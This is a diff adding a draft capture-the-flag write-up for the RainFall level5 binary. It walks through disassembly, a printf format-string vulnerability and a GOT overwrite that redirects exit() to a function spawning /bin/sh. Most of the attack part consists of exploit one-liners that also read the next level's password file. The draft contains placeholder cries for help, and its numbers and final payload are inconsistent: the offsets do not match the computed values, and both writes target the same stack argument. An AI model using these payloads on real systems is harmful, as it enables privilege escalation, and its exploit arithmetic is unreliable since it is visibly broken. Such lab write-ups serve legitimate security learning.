@@ -1,4 +1,167 @@
+For this level, we only have an executable called level5:
+
+```bash
+level5@RainFall:~$ ls -l
+total 8
+-rwsr-s---+ 1 level6 users 5385 Mar  6  2016 level5
+```
+
+Let’s try to execute it:
+
+```bash
+level5@RainFall:~$ ./level5
+
+```
+
+The program is waiting for input, so let’s try sending something and see if we get lucky and find the correct string:
+
+```bash
+level5@RainFall:~$ ./level5
+lol
+lol
+```
+
+Okey that's defiunitely taste like "deja vue", let's objdump it:
+
+```bash
+080484a4 <o>:
+ 80484a4:	55                   	push   %ebp
+ 80484a5:	89 e5                	mov    %esp,%ebp
+ 80484a7:	83 ec 18             	sub    $0x18,%esp
+ 80484aa:	c7 04 24 f0 85 04 08 	movl   $0x80485f0,(%esp)
+ 80484b1:	e8 fa fe ff ff       	call   80483b0 <system@plt>
+ 80484b6:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+ 80484bd:	e8 ce fe ff ff       	call   8048390 <_exit@plt>
+
+080484c2 <n>:
+ 80484c2:	55                   	push   %ebp
+ 80484c3:	89 e5                	mov    %esp,%ebp
+ 80484c5:	81 ec 18 02 00 00    	sub    $0x218,%esp
+ 80484cb:	a1 48 98 04 08       	mov    0x8049848,%eax
+ 80484d0:	89 44 24 08          	mov    %eax,0x8(%esp)
+ 80484d4:	c7 44 24 04 00 02 00 	movl   $0x200,0x4(%esp)
+ 80484db:	00
+ 80484dc:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+ 80484e2:	89 04 24             	mov    %eax,(%esp)
+ 80484e5:	e8 b6 fe ff ff       	call   80483a0 <fgets@plt>
+ 80484ea:	8d 85 f8 fd ff ff    	lea    -0x208(%ebp),%eax
+ 80484f0:	89 04 24             	mov    %eax,(%esp)
+ 80484f3:	e8 88 fe ff ff       	call   8048380 <printf@plt>
+ 80484f8:	c7 04 24 01 00 00 00 	movl   $0x1,(%esp)
+ 80484ff:	e8 cc fe ff ff       	call   80483d0 <exit@plt>
+
+08048504 <main>:
+ 8048504:	55                   	push   %ebp
+ 8048505:	89 e5                	mov    %esp,%ebp
+ 8048507:	83 e4 f0             	and    $0xfffffff0,%esp
+ 804850a:	e8 b3 ff ff ff       	call   80484c2 <n>
+ 804850f:	c9                   	leave
+ 8048510:	c3                   	ret
+ 8048511:	90                   	nop
+```
+
+The program calls the function n(), which:
+
+- Reads our input with fgets
+- Passes it directly to printf
+- Calls exit()
+
+The critical vulnerability is here:
+
+- printf(input); This is unsafe because our input is used as the format string.
+
+If the code were:
+
+- printf("%s", input); it would be safe.
+
+Since it uses printf(input), we can inject format specifiers like:
+
+- %x → read values from the stack
+- %n → write values to memory (the number of bits writen with printf()))
+
+```bash
+level5@RainFall:~$ ./level5
+AAAA %x %x %x %x %x
+AAAA 200 b7fd1ac0 b7ff37d0 41414141 20782520
+level5@RainFall:~$
+```
+
+We know that the **fourth** position is where is write our output of printf()
+
+The function o() is interesting because it calls system("/bin/sh");
+
+Its address is: "0x080484a4"
+
+If we can redirect execution to this address, we get a shell.
+
+After printing our input, the program calls exit().
+From the disassembly:
+
+```bash
+level5@RainFall:~$ objdump -d level5
+[...]
+Disassembly of section .plt:
+[...]
+080483d0 <exit@plt>:
+ 80483d0:	ff 25 38 98 04 08    	jmp    *0x8049838
+ 80483d6:	68 28 00 00 00       	push   $0x28
+ 80483db:	e9 90 ff ff ff       	jmp    8048370 <_init+0x3c>
+[...]
+```
+
+jmp \*0x8049838
+
+This means exit() jumps to the address stored in its GOT entry at **0x08049838**
+
+If we overwrite that GOT entry with **0x080484a4** then when exit() is executed, it will jump to o() instead.
+
+1. We want to write something at the 4th position in the stack
+
+```bash
+(python -c 'print("<>4$hn")' && cat) | ./level5 cat /home/user/level6/.pass
+```
+
+2. We want to write the adresse of exit jump aka **0x8049838** in the 4th position in the stack
+
+```bash
+(python -c 'print("\x38\x98\x04\x08%4$n")' && cat) | ./level5 cat /home/user/level6/.pass
+```
+
+3.  We want to write at the adresse in the 4th position in the stack aka **0x8049838**, the adressse of o() aka **0x080484a4**
+
+remember that the %n will wright the number of octet printed by printf()
+
+0x080484a4 -> decimal -> 134513828
+
+let's write that amount of bits in our printf call, but there is already 4 bits writen so 134513828 -4 = 134513824
+
+```bash
+(python -c 'print("\x38\x98\x04\x08%134513824x%4$n")' && cat) | ./level5 cat /home/user/level6/.pass
+```
+
+Okey we could stop here but that take so much time to write 134513828 charactere in the stdout, there is another way to write the o() adresse but with less characters :
+
+LIAM EXPLAIN PLEASEEE
+
+insteed of writing the 32 byte in one time we can write 16 then 16 other at the third place of the original adresse:
+
+\x38\x98\x04\x08 <- first adresse 16 byte to write
+\x39\x98\x04\x08
+\x3a\x98\x04\x08 <- third adresse 16 last byte to write
+\x3b\x98\x04\x08
+
+```
+Python 3.10.12 (main, Jan  8 2026, 06:52:19) [GCC 11.4.0] on linux
+Type "help", "copyright", "credits" or "license" for more information.
+Ctrl click to launch VS Code Native REPL
+>>> divmod(134513828, 1<<16)
+(2052, 33956)
+```
+
+LIAM EXPLAIN PLEASEEE
+
 Final exploit:
+
 ```bash
 level5@RainFall:~$ (python -c 'print("\x38\x98\x04\x08%2050x%4$hn\x3a\x98\x04\x08%31904x%4$hn")' && cat) | ./level5
 cat /home/user/level6/.pass
